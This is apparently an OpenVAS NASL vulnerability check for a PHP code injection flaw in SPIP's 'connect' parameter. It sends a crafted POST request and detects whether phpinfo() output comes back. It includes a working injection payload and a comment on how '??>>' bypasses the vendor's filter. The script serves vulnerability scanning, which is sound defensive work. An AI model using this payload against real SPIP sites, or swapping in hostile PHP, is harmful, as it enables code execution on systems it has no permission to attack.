###############################################################################
# OpenVAS Vulnerability Test
#
# SPIP 'connect' Parameter PHP Code Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:spip:spip";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103777");
  script_bugtraq_id(54292);
  script_cve_id("CVE-2013-4555", "CVE-2013-4556", "CVE-2013-4557");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_version("2019-04-23T06:25:48+0000");

  script_name("SPIP 'connect' Parameter PHP Code Injection Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/54292");
  script_xref(name:"URL", value:"http://www.securitytracker.com/id/1029317");

  script_tag(name:"last_modification", value:"2019-04-23 06:25:48 +0000 (Tue, 23 Apr 2019)");
  script_tag(name:"creation_date", value:"2013-08-29 12:05:48 +0200 (Thu, 29 Aug 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("gb_spip_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("spip/detected");

  script_tag(name:"impact", value:"An attacker can exploit this issue to inject and execute arbitrary PHP
  code in the context of the affected application. This may facilitate a compromise of the application and the
  underlying system, other attacks are also possible.");

  script_tag(name:"vuldetect", value:"Tries to execute the phpinfo() function by sending an HTTP POST request.");

  script_tag(name:"insight", value:"SPIP contains a flaw that is triggered when input passed via the 'connect'
  parameter is not properly sanitized before being used.");

  script_tag(name:"solution", value:"Vendor updates are available.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"SPIP is prone to a remote PHP code injection vulnerability.");

  script_tag(name:"affected", value:"SPIP versions prior to 2.0.21, 2.1.16, and 3.0.3 are vulnerable. Other
  versions may also affected.");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");

if (!port = get_app_port(cpe:CPE))
  exit(0);

if (!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if (dir == "/")
  dir = "";

host = http_host_name(port:port);

for(i=0;i<2;i++) { # sometimes there is no output from phpinfo() on the first request. So try twice...

  ex = 'connect=??>><?php phpinfo();#'; # there is a typo in ecran_securite.php (line 260) which makes str_replace() looking for the string "?>". With "??>>" we could bypass this workaround. Some installations also need to comment out all behind the command...
  len=strlen(ex);

  req = 'POST ' + dir + '/spip.php HTTP/1.1\r\n' +
        'Host: ' + host + '\r\n' +
        'Content-Type: application/x-www-form-urlencoded\r\n' +
        'Content-Length: ' + len + '\r\n' +
        'Connection: close\r\n' +
        '\r\n' +
        ex;

  result = http_send_recv(port:port, data:req, bodyonly:FALSE);

  if("<title>phpinfo()</title>" >< result) {
    security_message(port:port);
    exit(0);
  }
}

exit(99);
